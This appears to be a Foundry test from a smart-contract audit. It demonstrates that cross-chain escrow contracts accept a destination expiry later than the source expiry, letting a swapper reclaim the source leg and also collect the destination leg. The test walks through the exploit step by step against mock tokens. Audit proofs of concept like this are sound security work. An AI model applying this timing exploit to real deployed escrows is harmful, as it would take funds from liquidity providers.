// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/crosschain/EscrowSrc.sol";
import "../../src/crosschain/EscrowSrcFactory.sol";
import "../../src/crosschain/EscrowDst.sol";
import "../../src/crosschain/EscrowDstFactory.sol";
import "../mocks/MockERC20.sol";
import "../mocks/MockPermit2.sol";

/// Cross-chain finding §4 (crosschain.md): the `T2 < T1` timelock invariant is
/// asserted in a code comment but never enforced on-chain, and is expressed in
/// `block.number` — which is not comparable across two heterogeneous chains.
///
/// This test runs both escrows in one VM (so `block.number` is shared) purely to
/// demonstrate that the *contracts* place no relationship between the two
/// expiries. With `T2 >= T1` — which both factories accept without complaint —
/// the swapper reclaims the source leg AND is paid the destination leg, while
/// the filler loses the leg they funded. Atomicity is broken.
contract CrossChainTimelockTest is Test {
    // ── Chain A (source) ──────────────────────────────────────────────────────
    EscrowSrc        srcImpl;
    EscrowSrcFactory srcFactory;
    MockPermit2      permit2;
    MockERC20        weth;   // input token

    // ── Chain B (destination) ─────────────────────────────────────────────────
    EscrowDst        dstImpl;
    EscrowDstFactory dstFactory;
    MockERC20        usdc;   // output token

    uint256 cosignerKey = 0xA11CE;
    uint256 swapperKey  = 0xB0B;
    address cosigner = vm.addr(cosignerKey);
    address swapper  = vm.addr(swapperKey);
    address filler   = makeAddr("filler");

    uint256 constant INPUT_AMOUNT = 2 ether;   // 2 slots x 1 ether
    uint256 constant SLOT_WETH    = 1 ether;   // slot 0 amount
    uint256 constant SLOT_USDC    = 2500e6;    // what the filler locks on Chain B
    uint8   constant NUM_SLOTS    = 2;
    uint256 constant DEPOSIT      = 0.01 ether;

    // T1 = source expiry (order.deadline); T2 = destination expiry (filler-chosen).
    // NOTE the WRONG ordering T2 > T1 — nothing on-chain rejects it.
    uint256 constant T1 = 150;
    uint256 constant T2 = 200;

    bytes32 secret0   = keccak256("secret-0");
    bytes32 secret1   = keccak256("secret-1");
    bytes32 hashlock0 = keccak256(abi.encodePacked(secret0));
    bytes32 hashlock1 = keccak256(abi.encodePacked(secret1));
    bytes32 leaf0     = keccak256(bytes.concat(keccak256(abi.encode(hashlock0, uint8(0)))));
    bytes32 leaf1     = keccak256(bytes.concat(keccak256(abi.encode(hashlock1, uint8(1)))));
    bytes32 root;

    function setUp() public {
        permit2    = new MockPermit2();
        weth       = new MockERC20("Wrapped Ether", "WETH");
        srcImpl    = new EscrowSrc();
        srcFactory = new EscrowSrcFactory(address(srcImpl), address(permit2), cosigner);

        usdc       = new MockERC20("USD Coin", "USDC");
        dstImpl    = new EscrowDst();
        dstFactory = new EscrowDstFactory(address(dstImpl));

        weth.mint(swapper, INPUT_AMOUNT);
        vm.prank(swapper);
        weth.approve(address(permit2), type(uint256).max);

        usdc.mint(filler, SLOT_USDC);
        vm.deal(filler, 10 ether);

        root = _hashPair(leaf0, leaf1);
        vm.roll(100);
    }

    function _hashPair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));
    }

    function _info() internal view returns (EscrowSrcFactory.OrderInfo memory) {
        return EscrowSrcFactory.OrderInfo({
            swapper: swapper,
            inputToken: address(weth),
            inputAmount: INPUT_AMOUNT,
            outputToken: address(usdc),
            minOutput: 0,
            deadline: T1,            // ← source escrow inherits T1 as its expiry
            nonce: 1,
            merkleRoot: root,
            numSlots: NUM_SLOTS
        });
    }

    function _sign(uint256 key, bytes32 orderHash) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", srcFactory.DOMAIN_SEPARATOR(), orderHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return abi.encodePacked(r, s, v);
    }

    // Fund + deploy the source escrow for slot 0 (expiry = T1).
    function _openSrc() internal returns (EscrowSrc escrow) {
        EscrowSrcFactory.OrderInfo memory info = _info();
        bytes32 orderHash = srcFactory.hashOrder(info);

        bytes32[] memory proof0 = new bytes32[](1);
        proof0[0] = leaf1;

        vm.prank(filler);
        escrow = EscrowSrc(
            srcFactory.fillSlot{value: DEPOSIT}(
                info, _sign(swapperKey, orderHash), _sign(cosignerKey, orderHash), 0, hashlock0, proof0
            )
        );
    }

    // Fund + deploy the destination escrow for the SAME hashlock (expiry = T2).
    function _openDst() internal returns (EscrowDst escrow) {
        address predicted = dstFactory.computeAddress(hashlock0, filler);
        vm.prank(filler);
        usdc.transfer(predicted, SLOT_USDC);

        vm.prank(filler);
        escrow = EscrowDst(
            dstFactory.deploy(hashlock0, swapper, address(usdc), SLOT_USDC, T2)
        );
    }

    // ── the exploit: T2 >= T1 lets the swapper collect both legs ───────────────
    function test_T2geqT1_swapperTakesBothLegs() public {
        EscrowSrc src = _openSrc();
        EscrowDst dst = _openDst();

        // The contracts accepted T2 > T1 with no relationship check at all.
        assertEq(src.expiry(), T1);
        assertEq(dst.expiry(), T2);
        assertGt(dst.expiry(), src.expiry()); // the broken ordering, unflagged

        uint256 swapperWethBefore = weth.balanceOf(swapper);
        uint256 swapperUsdcBefore = usdc.balanceOf(swapper);

        // Roll into the danger zone: source expired, destination still active.
        vm.roll(160); // T1(150) < 160 < T2(200)
        assertEq(src.status(), "expired");
        assertEq(dst.status(), "active");

        // 1) Source leg: swapper reclaims their WETH (and pockets the deposit).
        vm.prank(swapper);
        src.cancel();
        assertEq(weth.balanceOf(swapper), swapperWethBefore + SLOT_WETH);

        // 2) Destination leg: the secret is still claimable, paying the swapper.
        dst.claim(secret0);
        assertEq(usdc.balanceOf(swapper), swapperUsdcBefore + SLOT_USDC);

        // Swapper walked away with BOTH legs; the filler funded USDC and got nothing.
        assertEq(usdc.balanceOf(filler), 0);
        assertEq(dst.status(), "claimed");
        // The filler cannot recover on Chain B either — it's already claimed.
        vm.prank(filler);
        vm.expectRevert("settled");
        dst.refund();
    }
}
